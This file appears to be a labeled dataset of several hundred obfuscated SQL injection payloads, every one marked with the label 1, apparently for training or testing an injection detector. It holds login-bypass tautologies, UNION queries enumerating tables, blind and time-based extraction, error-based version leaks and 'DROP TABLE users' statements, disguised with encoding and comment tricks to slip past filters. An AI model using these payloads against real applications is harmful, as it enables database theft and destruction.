"1%27%20UniOn%20sElECT%20tAbLe_NaMe,%20nULl,%20NulL%20fROM%20informaTiOn_SChema.taBlES%20%20Or%20(1)--", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3%u0020/*!*/AND%u00201=1----9e0ax9nr", 1
"WaitFor/*!*/DELAY%20%270:0:5%27--", 1
"1'/*!12345*/XOR ascii(substring(database(), 1, 1)) > 100 ----71hoz6bh1", 1
"test%2527%2520O/*!12345*/R%2520%25271%2527%253E%253D%25271%2527%2520%2F%2A", 1
"'/**/OR/**/1 =  1/**/--/**/", 1
"%31%27/*!*/UNION SELECT%20table_name, n%75ll, null %46ROM inform%61tion_%73chema.tables  OR 'b'='b'--#hc%6dxk", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 ----eazd5bdhvi", 1
"admiN'OR'1'='1", 1
"or/*%0a*/(1)/*%0d%0A*/", 1
"' uNioN seLEcT nUlL, nulL, NUlL --", 1
"1'%09%09AND%09%09substring(database(),%09%091,%09%091)%09%09%20=	%09%09's'%09%09--", 1
"tESt'%09or%09'1'%20=%20'1'%09/*", 1
"%27%20Or%20existS(SElECT%201%20fRoM%20Users)--", 1
"%27AND%65x%74r%61ctvalue(1,concat(0x%35c,%76ersion%28)))----srdhqm7%0d%0a", 1
"1'    OR    IF(substring(database(),    1,    1)%20=	'a',    SLEEP(5),    0)    --", 1
"%u0027AND/*%0a*/1=convert(int,@@version)/**/OR/**/(1)--%0d%0a", 1
"1 And 1=1", 1
"test%27 OR %271'%3d'1' --", 1
"1AnD", 1
"1>=1%0d%0A", 1
"1%27%2520OR%2520ascii%28substring%28database%28%29%2C%25201%2C%25201%29%29%2520%3E%2520100%2520--", 1
"1)		UN/**/ION		SELECT		1,database(),3 /*!*/AND 1=1--", 1
"1'/**/UNION%20%20%20%20SELECT%20%20%20%20table_name,%20%20%20%20null,%20%20%20%20null%20%20%20%20FROM%20%20%20%20information_schema.tables%20%20%20%20----vtbzru", 1
"1'/**/or %61sC%49I(su%42STRing(dAT%61B%61SE(), %31, 1)) > 100 --", 1
"'/*!12345*/AND%09%09extractvalue(1,concat(0x5c,version()))--", 1
"1'UNION", 1
"SELECTtable_name,null,nullFROMinformation_schema.tables", 1
"--", 1
"%u0027%U0020oR%u00201LiKE1%U0020 OR 'B'='B'--%u0020", 1
"1%29%29UNION%2F%2A%250d%250a%2A%2FSELECT%250d%250a1%2Cdatabase%28%29%2C3--%250a", 1
"%3B%09%09%09%09SELECT%09%09%09%09pg_sleep%285%29%3B%09%09%09%09--", 1
"1)UNIoN%0d%0aSeLeCT/*%0d%0a*/1,daTaBASe(),3--%0d%0a", 1
"%27%%320OR%20EXISTS(SEL%45CT%%3201%20FROM%20users)-%2d--%6dvp3cev", 1
"'/*!*/UniON seLecT 1,2,3----ub1zgj6tqem2tt2", 1
"%u0027OR/*%0%61*/%u00271%27=%u00271%0d%0a--61cw973s0x91g4", 1
"1)%20UNiO%4e%20selEct%201,d%61T%61BaSe%28),3--", 1
"'OR", 1
"'1'='1/*%0d%0a*/", 1
"' u%6eIon S%65lE%43t %6eulL, NuLL, nULl --", 1
"'/*!12345*/ANd/**/1=cOnvErt(InT,@@vErSion)--", 1
"1))UN/**/ION%0d%0aSELECT1,database(),3--/*%0d%0a*/", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--#f9l7784hmkvjl31", 1
"WAITFO/*!12345*/R%25u0020DELAY%25u0020%25u00270%3A0%3A5%25u0027--", 1
"'%09%09%09%09%09OR%09%09%09%09%09'1'=	'1/*%0d%0a*/", 1
"1))%u0020UN/**/ION%u0020SELECT%u00201,database(),3--", 1
"'/**/Or exiStS(seleCt 1 FroM Users)--", 1
"%27oR", 1
"ExISTs(SeLect1%0aFrom", 1
"UseRs)--", 1
"aDmIn' || '1'='1", 1
"waiTfOr DeLaY '0:0:5'--#p596b", 1
"admin'/*!*/%0d%0aOR%0d%0a", 1
"'1'%09=	'1", 1
";/**/DROP%u0020TABLE%u0020users;%u0020--#9i2n48m", 1
"test' || '1'%3d'%31' --%20", 1
";%u0020SELECT%20pg_s%6ce%65p(5);%u0020--", 1
"%u0027/*!12345*/OR%09%u00271%u0027%u0020%u0020=%20%u00271", 1
"1'/**/&&/**%2f(1=1%29su%62string(%64a%74abas%65(),/**/1,/**/1)/**/LIKE/*%2a/'s'/**/%2d-", 1
"'	OR	EXISTS(SELECT	1	FROM	users)	OR	'b'=%09'b'--/*%0a*/", 1
"1%20ANd%201%3D1%20OR%20%27B%27%3D%27b%27", 1
"' AND 1=1  /*!*/AND 1=1-- --cn0b9wm", 1
"1))%20%20%20%20%20UNION%20%20%20%20%20SELECT%20%20%20%20%201,database(),3--", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20--%20--9wz766", 1
"1/*!*/AND 1=1#vyukziz", 1
"1/**/aND/**/1%3d1", 1
"%57AITFOR/**/DE%4cAY/**/'0:0:5'/**/%2d%2d/**/random_noise--", 1
";dRoptABle%0aUSeRs;--", 1
"", 1
"%27/**/UN/**/ION/**/SELECT/**/1,2,3--", 1
"%2527%2520UniON%2520sELEcT%25201%2C2%2C3--", 1
"1'/**/AND/%2a*/subst%72ing(data%62ase%28%29,/**/1,/**/1)/**/=/**/'%73'/**/ AND%20'a'='%61'--", 1
"test'OR%0a'1'LIKE'1'/*", 1
"admin'/**/OR%20%20%20%20%20'1'> = '1", 1
"'%20%20%20OR%20%20%20'1'%09=	'1", 1
"1%u00%327UNIONSEL%45C%54table_n%61me,null,nullFROM%%30ainformation_schema.%74ables----j%73gj%35", 1
"%27%09UNION%09SELECT%091%2C2%2C3--", 1
"WAITFO/*!*/RDELAY%0d%0a'0:0:5'--", 1
"'or%0d%0a'1'='1%0d%0a", 1
"'%20OR%20'1'	=%09'1", 1
"1' AND s%75bst%72%69ng(d%61tabase(), 1,%201) <= 's' --", 1
"1%u002%37%20%20%20%%320AND%20%2%30%20%%320s%75b%73t%72ing(database(),%20%20%20%201,%20%20%20%201)%20%20%20%20%u0020%u0020%3d%u0020%%320%20%20%20%u%300%327s%u0027%20%20%20%%320--", 1
"' unioN sEleCT 1,2,3 /*!*/AND 1=1--", 1
"; DRop TaBlE USErS;  && (1=1)'a'='a'--#34c1n", 1
"' UNION SEL%45CT 1%2c2,3-%2d", 1
"%u0027/**/Or/**/%u00271%u0027=%u00271/**//*!*/anD/**/1=1", 1
"W%41%49TFOR%2%30%20DELAY%20%2%30'0%3a0:5'----yema14m6pqunz", 1
"'%09%09UNI%4fN%09%0%39SE%4cECT%09%09null%2c%09%09null,%09%09null%09%0%39--%09%0%39--y5rhdr3zwu", 1
"'oR", 1
"eXIstS(SELect1fROM%0d%0aUseRS)--%0a#r1lA1BOw6gf876", 1
"%31'aNdsUBStRing%28datABASe(%29,1,/*%0d%0A%2a/%31)LIKE", 1
"'s'--", 1
"test'O/**/R'1'='1'--%0a%0d%0a", 1
"'A/**/ND%0aextractvalue(1,concat(0x5c,version())) -- random_noise--%0a", 1
"1%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--#a3a7p", 1
"1))%20UN%49O%4e%20%53ELECT%201,da%74abase(),3--", 1
"WAI%54FOR/**/DEL%41Y '0:0:%35'--", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3/*!*/AND1=1--%0a", 1
"test%27%20OR%20%271%27IN%20%281%29%271%27%20AND%0a'a'='a'--%20/*%0d%0a*/", 1
";/**/SELECT/**/pg_sleep(5);/**/----uasxd4cto7me3q8", 1
"1%27%09%09%09oR%09%09%09If%28SUBstRIng%28datAbaSE%28%29%2c%09%09%091%2C%09%09%091%29%09%3d%27a%27%2C%09%09%09slEEp%285%29%2c%09%09%090%29%09%09%09--%0a", 1
"%u0027AND/*%0d%0a*/1=1 OR 'b'='b'--", 1
"%u0027%u002%30AND%u002%30e%78tractv%61lue(1,con%63at(0x5c,vers%69on()))--", 1
"1%25u0027%25u0020uNIOn%25u0020Select%2520tABlE%255fnaMe%2C%25u0020nu%256CL%2C%25u0020%256E%2575LL%25u0020frOm%25u0020IN%2566%256fRMaTion_sCHEma.TabLES%2520--", 1
"%u0027/**%2fAND%u0020e%78tractvalu%65(1,%63oncat(0x5c,%76ers%69on()))--", 1
"1' OR IF(substring(database(), 1, 1)<='a', SLEEP(5), 0)  AND 'a'='a'--", 1
"%u0027%u0020%u0020%u0020%u0020UNION%u0020%u0020%u0020%u0020SELECT%u0020%u0020%u0020%u0020null,%u0020%u0020%u0020%u0020null,%u0020%u0020%u0020%u0020null%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020||%u0020%u0020%u0020%u0020(1)--%u0020%u0020%u0020%u0020", 1
"%27%20UNION%20SELE%2543T%20null%2C%20nul%256c%2C%20null%2520-%252d%20", 1
"1'ANDsubstring(database(),%0a1,1)/*%0d%0a*/='s'--%0a", 1
"'%09%09%09%09O%52%09%09%09%09EXIS%54S(SELE%43T%%309%09%09%091%%309%09%09%%309FROM%09%09%09%0%39users)--", 1
"%27%2F%2A%21%2A%2FoR%20%271%27%3D%271", 1
"'        OR        EXISTS(SELECT        1        FROM        users)--", 1
"'/**/%55NIO%4e SE%4cECT null, null, n%75ll -- #855gkzezfx", 1
"'%20|| 1%3d1 --", 1
"1))UNiOnsELECT/*%0A*/1,daTABAsE(),3--/*%0d%0a*/", 1
"1'%09%09XOR%09%09substring(database(),%09%091,%09%091)%09%09>%09=  %09%09's'%09%09--#wtqc0nebmv", 1
"%u0027	OR	%u00271%u0027%09=%u0020%u00271", 1
"%25u0027%25u0020XOR%25u0020%25u00271%25u0027IN%25u0020%281%29%25u00271", 1
";SELECT", 1
"pg_sleep(5);%0d%0a--/*%0d%0a*/", 1
"'/**/Or/**/'1'='1--WmzuLcE98nP8LBs", 1
"'/**/and 1LIKEcOnvERT(int,@@VErsIoN) OR (1)--", 1
"1'    or    AsCIi(subsTRIng(DataBasE(),    1,    1))    >    100    --", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020 -- random_noise--", 1
"1)UNIONSELECT1,database(),3%20AND%20%27a%27%3D%27a%27--", 1
"", 1
"t%65st' OR '1'='1' /*--%65%7a9%73dvds3uz", 1
"'/**/OR/**/1=1/**/--/**/--lqganv3m", 1
"test%u0027%u0020OR%u0020%u00271%u0027LIKE%u00271%u0027%u0020--%u0020", 1
"WAitfoR dElAY '0:0:5'--", 1
"'oR/*%0a*/exiSTs(seLecT", 1
"1%0afROMUseRs)--", 1
"tEST%27%20oR%20%271%27%3D%271%27%20/*", 1
"%3B%20SEL/*!*/ECT%20pg_sleep%285%29%3B%20----7t7jem4zov06bto", 1
"1%u0027%u0020oR%u0020asCIi(sUBstring(daTaBasE(),%u00201,%u00201))%u0020>%u0020100%u0020 OR 'b'='b'--#17u2a5axgtb", 1
"test'/**/OR/**/'1'%09=%20'1'/**//*", 1
"test'%20||/*!*/(1=1)'1'>%3d'1%27 --", 1
"tEst%27%20Or%20%271%27%3D%271%27%20/*/*!*/OR 'b'='b'", 1
"test'/**/OR/**/'1'='1'/**//**/OR/**/'b'='b'--/**/#pilgmo7", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  OR 'b'='b'----v2yrrgx49szw", 1
"'  OR  1%20IN (1)	1  --  #gwh5g3hc4", 1
"1'ANDsubstring(database(),1,1)%0d%0a='s'", 1
"--", 1
"1'/**//**//**//**//**/OR/**//**//**//**//**/IF(substring(database(),/**//**//**//**//**/1,/**//**//**//**//**/1)/**/=%20'a',/**//**//**//**//**/SLEEP(5),/**//**//**//**//**/0)/**//**//**//**//**/--", 1
"%27AND1%3E%3D1 AND 'a'='a'--", 1
"", 1
"1'ANDsubstring(database(),1,1)='s'--", 1
"", 1
"1)%u0020uNiON%U0020seleCT%U00201,DATAbASe(),3--", 1
"test'||(1=1)'1'=%09'1'", 1
"--%0a#96oag5wmk", 1
"1'/**/xoR/**/Ascii(Substring(DatABasE(),/**/1,/**/1))/**/>/**/100/**/--", 1
"'/**/UniON/**/selECT/**/1,2,3--", 1
"'/*!*/AND 1=1 -- --8ao99j", 1
"' AnD Ex%74RACt%76ALUE(1,co%6E%63At(0x5c,vErSIon()))-%2d", 1
"'%09%09%09uNIoN%09%09%09seLECt%09%09%091,2,3--", 1
"1%2F%2A%21%2A%2FA%254eD%20%2531%3D1", 1
"'/**/OR/**/1%09=%201/*%2a/%2d-/%2a*/", 1
"' UnIOn selEcT 1,2,3--", 1
"'%09%09UNION%09%09SELECT%09%091,2,3--#qh18aybr", 1
"'AND%0d%0aextractvalue(1,concat(0x5c,version())) OR 'b'='b'--%0d%0a", 1
"1%27ANDsubstring(database(),1,%0d%0a1)%3D/*%0d%0a*/%27s%27--random_noise--", 1
"1%2527%2520Or%2520ASciI%28SUbsTrIng%28DATAbASe%28%29%2C%25201%2C%25201%29%29%2520%253E%2520100%2520--", 1
"%27%09%09%09%09AND%09%09%09%091%20%3D%201%09%09%09%09%20OR%20%27b%27%3D%27b%27--%09%09%09%09", 1
"'/*!12345*/aNd/**/eXtrACtVAluE(1,cONCAt(0x5c,VerSiON()))--", 1
"1'ANDsubstring(database(),", 1
"1,/*%0a*/1)='s'--", 1
"%3B%2F%2A%2A%2FDROP%2F%2A%2A%2FTABLE%2F%2A%2A%2Fusers%3B%2F%2A%2A%2F----tpyeeb09uuy", 1
"admin'%09%09%09%09OR%09%09%09%09'1'	LIKE'1", 1
"", 1
"%u0027%u0020||%u0020(1IN (1)1)%u00271%u0027=%u00271", 1
"%253bDRO%2550%250d%250aTABLE%0Auser%2573%3B--%0A", 1
"' UNION S%45LEC%54%201,2,3--", 1
"' && extractvalue(1,concat(0x5c,version())) OR 'b'='b'--", 1
"1)) u%4EIon sE%4cEct 1%2CdAtabAs%65(),3 -- random_noise--", 1
"TeSt' OR '1'Like'1' /*", 1
"admin' OR '1'='1#5zoc3m", 1
"; dRoP tAbLe useRS; ----zzqnhejlpl1h133", 1
"' UNION S%45%4cECT n%75ll, null, null%20 -- r%61ndom_noise%2d-", 1
"'  AND  1	=%091  --", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20%20#%20more_noise--#oerf0itmcf", 1
"1%27/*!*/OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--", 1
"'%20%20%20%20%20XOR%20%20%20%20%201%20=%20convert(int,@@version) OR (1)--", 1
"1/*!*/AND        1LiKE1", 1
"test'/**/OR/**/'1'='1'/**/--/**/--p23veo4o", 1
"%27%20AND%201%3Dconvert(int,@@version)--#rbiiyd4xrpeuh88", 1
"%2531%29%20unio%254E%20sELeCt%201%2CD%2561TabasE%28%29%2C%2533--", 1
"ad%6din%27OR%0d%0a%27%31%27%3D%271", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3--%0arandom_noise--%0a", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))----z6496d5lqwc", 1
"1%27/**/%4fR%2%30IF(sub%73tring(database(%29,%%3201,%2%301)%3D%27a%27,%20SLE%45P%285),%200)%20--", 1
"1))UNiON", 1
"SeleCT%0a1,dATabasE(),3--", 1
"1%u0027/**/And/**/suBstRiNG(database(),/**/1,/**/1)/**/=/**/%u0027s%u0027/**/--", 1
"%31' AND %73ubstring(database(%29, 1,%201) LIKE 's'%20--", 1
"1/**/AND/**/1=1--mlt3ikw4x0x91c", 1
"1))/*!*/UNION%u0020SELECT%u00201,database(),3--", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20/*!*/AND%0d%0a1=1--", 1
"' a%4Ed 1=1 %2D-", 1
"1) UNion select 1,DAtAbaSE(),3--", 1
"'/**//**//**//**//**//**//**//**/AND/**//**//**//**//**//**//**//**/extractvalue(1,concat(0x5c,version()))--", 1
"'/**/|| (1=1)1=1 -- --so4759uu0hdevj", 1
"'AND%0d%0a1=1%0a AND 'a'='a'--#niwi3775bp", 1
"'OR%0a1=1--%0d%0a", 1
"'UNION/*%0d%0a*/SELECTnull,null,null--#7g5f4089k", 1
"'	AND	extractvalue(1,concat(0x5c,version()))--", 1
"test'/**/O/*!12345*/R/**/'1'='1'/**/--/**/", 1
"test'					OR					'1' =	'1'					/*", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020#ramv9cbgp4kp6p", 1
"%3B%2F%2A%2A%2FdRop%2F%2A%2A%2FtaBLE%2F%2A%2A%2FuSERs%3B%2F%2A%2A%2F%20%2F%2A%21%2A%2FAND%201%3D1--", 1
"1%27%09%09%09%09%09%7C%7C%09%09%09%09%09%281%20%3D%25091%29IF%28substring%28database%28%29%2C%09%09%09%09%091%2C%09%09%09%09%091%29%20%3D%2509%27a%27%2C%09%09%09%09%09SLEEP%285%29%2C%09%09%09%09%090%29%09%09%09%09%09--%23pfxp0vs2y1vup", 1
"'	%09XOR		EXIST%53%28SELECT		1%09	FROM		us%65rs)--", 1
"tesT' Or '1'='1' -- --S79rxTYlJWh53", 1
"WAITFO/**/R%20DELAY%20%270%3A0%3A5%27%20OR%20%27b%27%3D%27b%27--", 1
"1) UNION SELECT 1,database(),3--#coeywm", 1
"%u0027/*!*%2fAND%u00201>=conve%72t(int,@@version%29-%2d", 1
"%3B%20DROP%20TABLE%20users%3B%20%20OR%20%27b%27%3D%27b%27--", 1
"test%u0027%u0020OR%u0020%u00271%u0027	=%09%u00271%u0027%u0020--%u0020", 1
"test%27%20OR%20%271%27%3D%271%27%20%20--%20random_noise--%20", 1
"' unIon seLecT%20%31,%32,3--#y7f2xaihr0ywe", 1
"%27AND1%3D1%2F%2A%250d%250a%2A%2F--%0A%250a--hg4ctng", 1
"%u0027%u0020UNION%u0020SELECT%u00201,2,3--#2tx8ts5k", 1
"'				OR				'1'LIKE'1 OR 'b'='b'--yi6qq3op90g", 1
"test%27%2%30O%52%20%271%27%3D%271%27%%320%2d-%20", 1
"' and extRactvALue(1,cONCat(0X5C,veRSIoN()))--#dsyzcwcxm2krq", 1
";%20%20DROP%20%20TABLE%20%20users;%20%20--", 1
"'/*!12345*/xor EXtraCtvALuE(1,cOnCat(0x5C,VERSION())) /*!*/And 1=1--", 1
"'/%2a!12345*/AN%44 1=convert(int,%40@ver%73i%6fn)--", 1
"1%27%09UNION%09SELECT%09table_name%2C%09null%2C%09null%09FROM%09information_schema.tables%09--", 1
"'/*%2a/OR EXISTS(SEL%45CT 1 FROM%20user%73) OR (1)%2d-", 1
"'/**/AND/**/extractvalue(1,concat(0x5c,version()))--#xyvoxj6mn91", 1
"%27/**/UNION/**/SE%4cECT/**/null%2c/**/nul%6c,/**/null/**%2f--%2f**%2f", 1
";/**/DROP/**/TABLE/**/users;/**//**//*!*/AND/**/1=1--#5jbsl", 1
"%2527%2F%2A%21%2A%2FAND%25201%253D1%2520--%2520", 1
"aDMIn%u0027/**/OR/**/%u00271%u0027>=%u00271", 1
"1)) UNioN seleCt 1,dATAbaSE(),3--#eh6gx", 1
"%u0027%u0020AND%u00201%20%20LIKE%20convert(int,@@version)--", 1
"%27%20O/**/R%%3201%3D1%20%20%4fR%20%281%29--%2%30", 1
"WAITFOR%20DELAY%20%270:0:5%27%20--%20random_noise--", 1
"%27%2F%2A%21%2A%2FOR%20EXISTS%28SELECT%201%20FROM%20users%29 OR (1)--", 1
"%27%20OR%201%3D1%20--%20#hdutlz1baw", 1
"%u0027%u0020O%52%u%30%3020EXISTS(S%45LECT%u00201%u%30020FROM%u0%3020users)--", 1
"%u0027%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020AND%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u00201%u0020%u0020>=%u0020%u0020convert(int,@@version)--", 1
"'AND1=1--", 1
"", 1
"'%09%09%09ANd%09%09%09EXtrActvALuE(1,COncat(0X5c,vERSION()))%09%09%09/*!*/anD%09%09%091%09=1--", 1
"", 1
"1%2F%2A%2A%2FAND%2F%2A%2A%2F1%3D1/*!12345*/OR 'b'='b'", 1
"1'/**/AND/**/substring(database(),/**/1,/**/1)/**/IN (1)/**/'s'/**/ -- random_noise--", 1
"'%09%09%09%09%09oR%09%09%09%09%091	=%091%09%09%09%09%09--%09%09%09%09%09", 1
"1)	UNION	SELECT	1,database(),3----36zablctxza", 1
"1%25U0027%25u0020OR%25U0020if%28SUbStRInG%28daTaBASe%28%29%2C%25u00201%2c%25u00201%29%3D%25u0027a%25U0027%2C%25U0020sleEP%285%29%2c%25u00200%29%25U0020--", 1
"1%2%37%20A%4eD%%320substring(database(),%%3201,%20%31)%20%3D%%320%27s%27%20--", 1
"1)/**/UNION/**/SELECT/**/1,database(),3--#30yekh5hhp", 1
"1'ANDsubstring(database(),%0a1,1)='s'", 1
"--", 1
"1' unIOn sELECT tablE_name, nULL, NuLl fRom infORmatIon_SCHeMa.tABlES --", 1
"1%27%u0020OR%u0020I%46(substri%6eg(data%62ase(),%u00201,%201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%20--", 1
"%27%2520%2520%2520%2520%2520OR%2520%2520%2520%2520%2520%271%27%2520IN%20%281%29%20%271%20OR%20%281%29", 1
"teSt'/*!*/Or '1'='1' --", 1
"1))%20%20UNION%20%20SELECT%20%201,database(),3--#skxizdrl7jjf1k", 1
"%27OREXISTS(SELECT%0d%0a1/*%0d%0a*/FROMusers)--", 1
"%%327%20O%52%20EXISTS(SELECT%201%20FROM%2%30%75se%72s)--", 1
"1%27%20XOR%20I%46(substring(da%74abase(),%201,%201)%3D%27a%27,%20%53LEEP(5),%200)%20-%2d", 1
"1/**/ANd/**/1=1", 1
"test'OR'1'='1'%0a--", 1
";SELE%43T/*%0a*/pg_sle%65p(5)%3b%0d%0a--#caem%6fbtj%0a", 1
"' AND ext%72actval%75e(1,%63on%63%61t(0x5c,version()))--", 1
"1'/*!12345*/AND SUbStRIng(dATAbaSe(), 1, 1) = 's'  /*!*/AND 1=1--", 1
"1%27ORascii%28substring%28database%28%29%2C1%2C%0A1%29%29%3E%2F%2A%250d%250a%2A%2F100--", 1
"1%u0027%u0020||%u0020(1=1)IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"a%64mi%6e'/*!*/OR%09%09%09%09'1'  =%09'1", 1
"%27%20UnIoN%20SelecT%201,2,3----9nnqmcdknmvc", 1
"1%U0027/**/and/**/SUbstriNg(DAtABaSE(),/**/1,/**/1)/**/%3D/**/%U0027S%U0027/**/--", 1
"' %41ND 1=conver%74(int,@@ver%73%69on)--", 1
"WAITFO/*!12345*/RDELAY'0:0:5'--%0a#n1mrdi2k3ty5qyd", 1
"waITFOR/**/dELAY '0:0:5'--", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20----d9zguwrbp", 1
"1%27%20XO/*!*/R%20substring(database(),%201,%201)%20%3D%20%27s%27%20--", 1
"WAITFORDELA%59%0d%0a'0:%30:5'-%2d%0a", 1
"admin%2527%2520OR%2520%25271%25%32%37%253D%2%3527%31", 1
"%31'	OR	ascii(substring%28dat%61%62a%73e(),	1,	1))	>	100	--", 1
"admin'/**/OR/**/'1'='1--fr5ryscy5cmi7v", 1
"test%u0027OR/*%0a*/%u00271%u0027	>=%u00271%u0027%0d%0a--%0d%0a", 1
"%27%20or%201%3d1%20--%20--UJ67evZ732", 1
"'%41nd1=cOnvErT(%69%6ET,@@VER%73Ion)--", 1
"", 1
"'UnIoN/*%0a*/selECT/*%0d%0A*/1,2,3--#1JeUmV", 1
"", 1
"%27/*!12345*/OR%20%271%27%3D%271", 1
"'Or1=1%0a--/*%0a*/%0d%0a", 1
"1' AND substring(database(), 1, 1) = 's' ----sgu03lno0h7a", 1
"%25u0027%25u0020UNION%25u0020SELECT%25u00201%2C2%2C3----ugzgj", 1
"test'    OR    '1'%20LIKE%09'1'    --    --2mdvhvv5il", 1
"1%u0020AND%u00201=1%u0020#%u0020more_noise", 1
"1%27/**/AND substr%69ng(database%28), 1, 1) = %27s'%20--", 1
"%27 OR '1'=%271 # moRe_NoIse", 1
"1/**/AND 1<=1", 1
"1%29%2509%2509%2509%2509%2509UNION%2509%2509%2509%2509%2509SELECT%2509%2509%2509%2509%25091%2Cdatabase%28%29%2C3--%235p4279v8eucczb", 1
"admIN' Or '1'='1", 1
"1'      XOR      ascii(substring(database(),      1,      1))      >      100      --", 1
"%31%29%20UNION%20%53ELECT%201,dat%61base(),3--", 1
"test%27%20OR%20%271%27%3D%271%27%20--%20--nqa3c26u8", 1
"%25u0027%25u0020UNION%25u0020SELECT%25u0020null%2C%25u0020null%2C%25u0020null%25u0020--%25u0020", 1
"1%27%20OR%20IF(substring%28databa%73e(),%201,%201)%3d%27a%27,%20S%4cEEP(5),%200%29%20--", 1
"1%27%20%20%20%20%20AND%20%20%20%20%20substring(database(),%20%20%20%20%201,%20%20%20%20%201)%20%20%20%20%20%20%20%3D%20%20%20%20%20%20%27s%27%20%20%20%20%20--", 1
"1%29%20UN/*!*/ION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"1) UNION SELECT 1,database(),3----8nyf9ynsonqu57", 1
"WAitfOR%20Delay%20%270:0:5%27/**/AND/**/'a'='a'--", 1
"1'/*!12345*/OR IF(substring(database(), 1, 1)LIKE'a', SLEEP(5), 0)  -- random_noise--#iy243", 1
"%27%20AND%201%3D1%20%20OR%20(1)--%20", 1
"test' OR '1'=%271' %2f*", 1
";%20DROP%20TABLE%20users;%20 OR (1)--", 1
"1%29%20UN/*!12345*/ION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"AdmIn'/**/or/**/'1'='1--948n765y64w", 1
"1)UN/*!*/ION%0d%0aSELECT1,database(),3--", 1
"", 1
"tEST'/*!12345*/or/**/'1'='1'/**//*", 1
"%u0027%u0020AND%u00201%3Dconvert(int,@@version)--", 1
"' AND extra%63tvalue(1,co%6ecat(0x5c,%76e%72si%6fn())) OR 'b'LIKE'b'----zz54d4", 1
"'/**//**//**//**//**//**//**//**//**//**/AND/**//**//**//**//**//**//**//**//**//**/1/**//**/=	1/**//**//**//**//**//**//**//**//**//**/--/**//**//**//**//**//**//**//**//**//**/", 1
"%u0027/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/", 1
"1%20XOR%201%3D1", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20--#7r5joe4t5zdaghy", 1
"1%u0020AND%u00201=1%u0020OR%u0020%u0027b%u0027=%u0027b%u0027", 1
"admin'    OR    '1'  =%09'1", 1
"1'ORIF(substring(database(),1,1)='a',SLEEP(5),0)/*%0a*/#more_noise--", 1
";      DROP      TABLE      users;      --", 1
"adM%69N' Or '1'='1--k%36e4hl%73", 1
"%3B%2520DROP%2520T%2541BLE%20users%3B%20--", 1
"1'UNIONSELECTtable_name,null,nullFROM/*%0a*/information_schema.tables--%0d%0a", 1
"test%27%20OR%20%271%27%3C%3D%271%27%20--%20", 1
"' OR EXISTS(SELECT 1 FROM users)----ljoxfz", 1
"'/**/OR%09%091	=%201%09%09 /*!*/AND 1=1--%09%09#m4xsfh", 1
"1%u0027%u0020aNd%U0020SubsTRINg(dATaBaSe(),%u00201,%U00201)%u0020<=%u0020%u0027S%U0027%u0020--", 1
"1%u0027/**/AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--", 1
"test'OR/*%0d%0a*/'1'='1'/*%0a*//*/*%0d%0a*/", 1
"; DROP TABLE users; --#04iv7aqpu5z5", 1
"test%u0027%u0020O/*!12345*/R%u0020%u00271%u0027=%u00271%u0027%u0020 # more_noise--%u0020", 1
"1)/**/UNION SELECT 1,database(),3----lbfxq", 1
